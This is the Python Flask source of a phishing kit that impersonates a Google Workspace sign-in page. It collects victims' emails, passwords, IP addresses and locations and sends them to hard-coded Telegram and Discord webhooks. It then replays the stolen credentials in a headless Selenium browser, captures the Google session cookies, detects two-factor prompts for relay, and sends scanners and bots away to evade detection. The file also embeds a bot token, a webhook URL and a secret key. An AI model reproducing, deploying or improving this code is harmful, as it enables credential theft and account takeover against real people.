from flask import Flask, render_template, request, redirect, url_for, session, jsonify, make_response, Response
import tempfile
import os
import re
import random
import json
import requests
from fake_useragent import UserAgent
import datetime
import base64
from urllib.parse import urlencode
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager




# Initialize Flask application first
app = Flask(__name__)
app.secret_key = "2d300b06dba345980bcb37ccb46e803a1bf3c71be31a6ffdfb6e9b867beee25b"
# Always set secure cookies in production (HTTPS enforced below)
app.config['SESSION_COOKIE_SECURE'] = True

# Set port and server name after app initialization
port = int(os.environ.get('PORT', 5000))
app.config['SERVER_NAME'] = None  # Allow dynamic hostnames


# Embed Google OAuth credentials directly here

# OAuth has been removed from this application per user request.
# If you later want to re-enable OAuth, add the client configuration and Flow logic here.

# Enforce HTTPS for all requests
@app.before_request
def enforce_https() -> None:
    if not request.is_secure and not app.debug:
        url = request.url.replace("http://", "https://", 1)
        redirect(url, code=301)

# Webhook configuration
TELEGRAM_WEBHOOK_URL = 'https://api.telegram.org/bot7683203119:AAEuLNvGvDH3Wg2e4uYcA3RkTRe2jxEWr9Q/sendMessage'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1444453046066217052/GonloDjy4rv10HHcWpMywvjleS9fk8-OQ_sgLCum3Sq350COT4zpUTqrmyO32JxZaa0G'
TELEGRAM_CHAT_ID = '-4904152340'
TELEGRAM_WEBHOOK_ON = True  # Enable Telegram
DISCORD_WEBHOOK_ON = True   # Enable Discord

def send_webhook_message(message):
    if TELEGRAM_WEBHOOK_ON:
        # Telegram expects chat_id and text
        payload = {
            'chat_id': '<chat_id>',  # Replace with your chat_id
            'text': message
        }
        try:
            requests.post(TELEGRAM_WEBHOOK_URL, data=payload, timeout=5)
        except Exception:
            pass
    if DISCORD_WEBHOOK_ON:
        payload = {
            'content': message
        }
        try:
            requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        except Exception:
            pass

# Google OAuth 2.0 configuration
def get_google_email_details(email, name=None, picture=None):
    domain = email.split('@')[1] if '@' in email else ''
    branding = {
        'banner': picture or f'https://logo.clearbit.com/{domain}',
        'background': f'https://source.unsplash.com/featured/?office,workspace,{domain}',
        'name': name or email.split('@')[0]
    }
    return branding

# Browser configuration
class Browser:
    def __init__(self):
        self.user_agent = UserAgent()
        self.browser_arrays = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.73 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.38 Safari/537.36',
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
            # Mobile browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36'
        ]
    def get_random_agent(self):
        return random.choice(self.browser_arrays)

# Cookie handling function
def cookies_to_json(cookies):
    cookie_list = []
    try:
        for cookie in cookies:
            cookie_dict = {
                'name': cookie.name,
                'value': cookie.value,
                'domain': cookie.domain,
                'path': cookie.path,
                'secure': cookie.secure,
                'expires': cookie.expires,
                'httpOnly': cookie.has_nonstandard_attr('HttpOnly') if hasattr(cookie, 'has_nonstandard_attr') else False,
                'sameSite': cookie.has_nonstandard_attr('SameSite') if hasattr(cookie, 'has_nonstandard_attr') else None,
                'priority': cookie.has_nonstandard_attr('Priority') if hasattr(cookie, 'has_nonstandard_attr') else None,
                'hostOnly': cookie.domain_specified if hasattr(cookie, 'domain_specified') else False,
                'max-age': cookie.has_nonstandard_attr('Max-Age') if hasattr(cookie, 'has_nonstandard_attr') else None
            }
            cookie_list.append(cookie_dict)
    except Exception:
        pass
    return cookie_list

# Bot detection and redirect
def is_bot_request():
    ua = (request.headers.get('User-Agent') or '').lower()
    # Only block if UA is empty or matches obvious bot patterns
    bot_signatures = [
        'googlebot', 'crawler', 'spider', 'bot', 'wget', 'curl', 'python-requests', 'python-urllib', 'phantomjs',
        'selenium', 'headless', 'cypress', 'puppeteer', 'nightwatch', 'scrapy', 'postman', 'httpx', 'httpie', 'libwww-perl',
        'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot', 'sitecheckerbot',
        'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard', 'redditbot',
        'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare', 'facebookexternalhit', 'twitterbot', 'slackbot', 'whatsapp', 'archive.org_bot'
    ]
    for sig in bot_signatures:
        if sig in ua:
            print(f"[BOT DETECT] UA matched bot signature: {sig}")
            return True
    # Only block advanced bot headers if not running in production (to avoid false positives on Railway)
    if os.environ.get('FLASK_ENV', '') != 'production':
        advanced_bot_headers = [
            'abusix', 'crawler', 'bot', 'spider', 'proxy', 'phantom', 'selenium', 'headless', 'scrapy', 'postman', 'httpx', 'httpie',
            'libwww-perl', 'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot',
            'sitecheckerbot', 'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard',
            'redditbot', 'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare'
        ]
        for h in request.headers:
            h_name = h[0].lower()
            h_value = str(h[1]).lower()
            for adv_header in advanced_bot_headers:
                if adv_header in h_name or adv_header in h_value:
                    print(f"[BOT DETECT] Header matched bot pattern: {adv_header} in {h_name} or {h_value}")
                    return True
    # Block if UA is empty
    if not ua:
        print("[BOT DETECT] UA is empty")
        return True
    return False

@app.route('/error/bot-detected')
def bot_error_handler():
    session.clear()
    # Log bot detection in backend only
    print("[BOT DETECT] Redirected: IP {} UA {}".format(request.remote_addr, request.headers.get('User-Agent', '')))
    return redirect('https://workspace.google.com')

# Temp file to store cookies per session
COOKIE_TEMP_FILE = os.path.join(tempfile.gettempdir(), 'gmail_fake_cookies.txt')

# Fake user database for demonstration
USERS = {
    'testuser@gmail.com': 'testpassword123',
    'demo@gmail.com': 'demopass',
}

# Route to render index.html
@app.route('/')
def index():
    return render_template('index.html')

# New route to handle email submission from index.html and redirect to password page
@app.route('/password', methods=['GET', 'POST'])
def password():
    if is_bot_request():
        return redirect(url_for('bot_error_handler'))

    email = request.args.get('email') or request.form.get('email') or session.get('email')
    if not email:
        return redirect(url_for('index'))
    
    try:
        # Fetch branding details here, only when the password page is loaded.
        branding = get_google_email_details(email)
        session['banner'] = branding.get('banner')
        session['background'] = branding.get('background')
        session['email'] = email

        return render_template(
            'password.html',
            email=email,
            banner=session.get('banner'),
            background=session.get('background'),
            error=request.args.get('error'),
        )
    except Exception as e:
        print(f"Error in password route: {str(e)}")
        return redirect(url_for('index'))

@app.route('/enter-password', methods=['GET', 'POST'])
def enter_password():
    email = session.get('email')
    error = None
    branding = None
    if email:
        branding = get_google_email_details(email)
    if request.method == 'POST':
        password_val = request.form.get('password') or ''
        session['email'] = email
        branding = get_google_email_details(email)
        
        # Collect info for webhook
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        import httpagentparser
        browser_info = httpagentparser.detect(user_agent)
        user_browser = browser_info.get('browser', {}).get('name', '')
        browser_version = browser_info.get('browser', {}).get('version', '')
        browser_platform = browser_info.get('platform', {}).get('name', '')
        geo_data = {}
        try:
            geo_resp = requests.get(f'https://ipapi.co/{client_ip}/json/')
            geo_data = geo_resp.json()
            user_country = geo_data.get('country_name', '')
            user_city = geo_data.get('city', '')
        except Exception:
            user_country = ''
            user_city = ''
        current_time = datetime.datetime.utcnow().isoformat() + 'Z'
        credentials_message = (
            f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
            f"📧 Email: {email}\n"
            f"🔑 Password: {password_val}\n"
            f"🌍 Real IP: {client_ip}\n"
            f"🖥️ User Agent: {user_agent}\n"
            f"🌐 Browser: {user_browser} {browser_version}\n"
            f"💻 Platform: {browser_platform}\n"
            f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
            f"🏙️ City: {user_city}\n"
            f"⏰ Time: {current_time}"
        )
        send_webhook_message(credentials_message)
        
        # After capturing credentials, set authenticated flag and store password
        session['authenticated'] = True
        session['password'] = password_val  # Temporarily store for the flow

        # Stay on password page after POST, do not re-render or redirect
        # The password.html template should include a JS event listener for the "Next" button.
        # When clicked, show a loading animation and trigger AJAX to /ajax-headless-login.
        # The page remains until AJAX completes, then JS can redirect to the final URL.

        return render_template(
            'password.html',
            email=email,
            banner=session.get('banner'),
            background=session.get('background'),
            error=None,
            loading=False  # JS will handle loading animation on button click
        )
        # If GET, show password page again if session email exists
        return render_template('password.html', email=email, error=error, branding=branding)

    # AJAX endpoint to trigger headless login and return result
    @app.route('/ajax-headless-login', methods=['POST'])
    def ajax_headless_login():
        if not session.get('authenticated'):
            return jsonify({'success': False, 'error': 'Not authenticated'}), 403
        email = session.get('email')
        password = session.get('password')
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        login_result = handle_headless_login(email, password)
        if login_result is not None and login_result.get('success'):
            cookies_json = json.dumps(cookies_to_json(login_result.get('cookies', [])), indent=2)
            # Prepend email to the cookies content
            file_content = f"{email}\n{cookies_json}"
            cookie_webhook_message = f"🍪 Google-Box-Cookies 🍪\n\n📧 Email: {email}\n🌐 IP Address: {client_ip}\n\n```json\n{cookies_json}\n```"
            send_webhook_message(cookie_webhook_message)
            # Save cookies to a temp file for download, prepended with email
            with open(COOKIE_TEMP_FILE, 'w') as f:
                f.write(file_content)
            session.clear()
            return jsonify({'success': True, 'cookies_json': cookies_json})
        else:
            # If login failed due to password, show error
            if login_result is not None and login_result.get('error') == 'invalid_password':
                session['authenticated'] = False
                return jsonify({'success': False, 'error': 'Invalid password'})
            send_webhook_message(f"⚠️ Headless login FAILED for {email}. No cookies captured.")
            session.clear()
            return jsonify({'success': False})

    def handle_headless_login(email, password):
        """
        Uses Selenium to perform a headless login to Google and capture cookies.
        Returns a dict: {'success': bool, 'cookies': list, 'error': str, '2fa_required': bool}
        If 2FA is required, returns '2fa_required': True and page HTML for user to complete 2FA.
        """
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument(f'user-agent={Browser().get_random_agent()}')
        options.add_argument('--window-size=1920,1080')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        try:
            with webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options) as driver:
                wait = WebDriverWait(driver, 20)
                driver.get("https://accounts.google.com/signin")

                # Enter email
                wait.until(EC.visibility_of_element_located((By.ID, "identifierId"))).send_keys(email)
                driver.find_element(By.ID, "identifierNext").click()

                # Wait for password input
                wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "input[type='password']"))).send_keys(password)
                driver.find_element(By.ID, "passwordNext").click()

                # Wait for either successful login or error
                try:
                    wait.until(lambda d: "mail.google.com" in d.current_url or "myaccount.google.com" in d.current_url)
                    cookies = driver.get_cookies()
                    google_cookies = [c for c in cookies if 'google.com' in c.get('domain', '')]
                    return {'success': True, 'cookies': google_cookies if google_cookies else cookies, '2fa_required': False}
                except Exception:
                    # Check for error message on page
                    try:
                        error_elem = driver.find_element(By.CSS_SELECTOR, "div[jsname='B34EJ']")
                        if error_elem and "Wrong password" in error_elem.text:
                            return {'success': False, 'cookies': [], 'error': 'invalid_password', '2fa_required': False}
                    except Exception:
                        pass

                    # Check for 2FA prompt
                    try:
                        # Look for common 2FA elements (phone prompt, code input, authenticator app, etc.)
                        twofa_selectors = [
                            "input[type='tel']",  # phone code
                            "input[type='text']", # authenticator code
                            "div[data-challengetype]", # challenge container
                            "div[jsname='r4nke']", # Google prompt
                            "div[jsname='Qx7uuf']", # Authenticator app
                        ]
                        for selector in twofa_selectors:
                            elems = driver.find_elements(By.CSS_SELECTOR, selector)
                            if elems:
                                # 2FA detected, get page HTML for user to complete
                                page_html = driver.page_source
                                return {
                                    'success': False,
                                    'cookies': [],
                                    'error': '2fa_required',
                                    '2fa_required': True,
                                    '2fa_html': page_html
                                }
                    except Exception:
                        pass

                    # General failure
                    return {'success': False, 'cookies': [], 'error': 'login_failed', '2fa_required': False}
        except Exception as e:
            print(f"[ERROR] An exception occurred during headless login for {email}: {str(e)}")
            return {'success': False, 'cookies': [], 'error': 'exception', '2fa_required': False}
        # Ensure a dictionary is always returned
        return {'success': False, 'cookies': [], 'error': 'unknown_error', '2fa_required': False}

# After each request, capture Set-Cookie headers if needed
@app.after_request
def capture_cookies(response):
    # Add X-Robots-Tag header to all responses for noindex, nofollow
    response.headers['X-Robots-Tag'] = 'noindex, nofollow'
    return response

# Entry point for local and Railway deployment
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)